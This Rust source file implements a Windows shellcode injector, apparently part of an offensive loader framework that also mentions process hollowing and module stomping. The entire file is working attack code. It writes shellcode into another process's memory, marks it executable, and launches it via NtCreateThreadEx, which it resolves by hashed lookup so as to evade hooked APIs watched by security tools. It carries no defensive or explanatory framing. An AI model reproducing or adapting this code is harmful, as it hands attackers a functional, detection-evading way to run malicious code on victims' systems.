use crate::injection::Injector;
use anyhow::{anyhow, Result};

pub struct RemoteThreadInjector;

#[cfg(windows)]
impl Injector for RemoteThreadInjector {
    fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
        // RemoteThread injects shellcode, not PE images.  PE payloads must use
        // Hollowing, ManualMap, or ModuleStomp (which forwards to hollowing).
        let is_pe = payload.len() >= 2 && payload[0] == b'M' && payload[1] == b'Z';
        if is_pe {
            return Err(anyhow!(
                "RemoteThread injection requires raw shellcode, not a PE image. \
                 Use InjectionMethod::Hollowing or InjectionMethod::ModuleStomp for PE payloads."
            ));
        }

        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
        use winapi::um::processthreadsapi::OpenProcess;
        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE};
        use winapi::um::winnt::{PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_WRITE};

        unsafe {
            let h_proc = OpenProcess(
                PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
                0,
                pid,
            );
            if h_proc.is_null() {
                return Err(anyhow!("RemoteThread: OpenProcess failed"));
            }

            // Allocate RW first; switch to RX after writing to avoid RWX pages
            let remote_mem = VirtualAllocEx(
                h_proc,
                std::ptr::null_mut(),
                payload.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if remote_mem.is_null() {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("RemoteThread: VirtualAllocEx failed"));
            }

            let mut written = 0usize;
            if WriteProcessMemory(
                h_proc,
                remote_mem,
                payload.as_ptr() as _,
                payload.len(),
                &mut written,
            ) == 0
            {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("RemoteThread: WriteProcessMemory failed"));
            }
            if written != payload.len() {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!(
                    "RemoteThread: WriteProcessMemory wrote {} of {} bytes",
                    written,
                    payload.len()
                ));
            }

            // Switch to execute-read (no write)
            let mut old_prot = 0u32;
            if VirtualProtectEx(
                h_proc,
                remote_mem,
                payload.len(),
                PAGE_EXECUTE_READ,
                &mut old_prot,
            ) == 0
            {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!("RemoteThread: VirtualProtectEx to RX failed"));
            }

            // Use NtCreateThreadEx via pe_resolve to avoid the hooked CreateRemoteThread.
            let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
            let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
                .ok_or_else(|| anyhow!("RemoteThread: ntdll not found"))?;
            let fn_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
            let fn_ptr = pe_resolve::get_proc_address_by_hash(ntdll, fn_hash)
                .ok_or_else(|| anyhow!("RemoteThread: NtCreateThreadEx not found"))?
                as *mut winapi::ctypes::c_void;

            type NtCreateThreadExFn = unsafe extern "system" fn(
                *mut *mut winapi::ctypes::c_void,
                u32,
                *mut winapi::ctypes::c_void,
                *mut winapi::ctypes::c_void,
                *mut winapi::ctypes::c_void,
                *mut winapi::ctypes::c_void,
                u32,
                usize,
                usize,
                usize,
                *mut winapi::ctypes::c_void,
            ) -> i32;
            let nt_create: NtCreateThreadExFn = std::mem::transmute(fn_ptr);

            let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
            let status = nt_create(
                &mut h_thread,
                0x1FFFFF,
                std::ptr::null_mut(),
                h_proc,
                remote_mem,
                std::ptr::null_mut(),
                0,
                0,
                0,
                0,
                std::ptr::null_mut(),
            );
            if status < 0 {
                pe_resolve::close_handle(h_proc);
                return Err(anyhow!(
                    "RemoteThread: NtCreateThreadEx failed: {:x}",
                    status
                ));
            }
            if !h_thread.is_null() {
                pe_resolve::close_handle(h_thread);
            }
            pe_resolve::close_handle(h_proc);
        }
        Ok(())
    }
}

#[cfg(not(windows))]
impl Injector for RemoteThreadInjector {
    fn inject(&self, _pid: u32, _payload: &[u8]) -> Result<()> {
        Err(anyhow!("RemoteThread injection only supported on Windows"))
    }
}
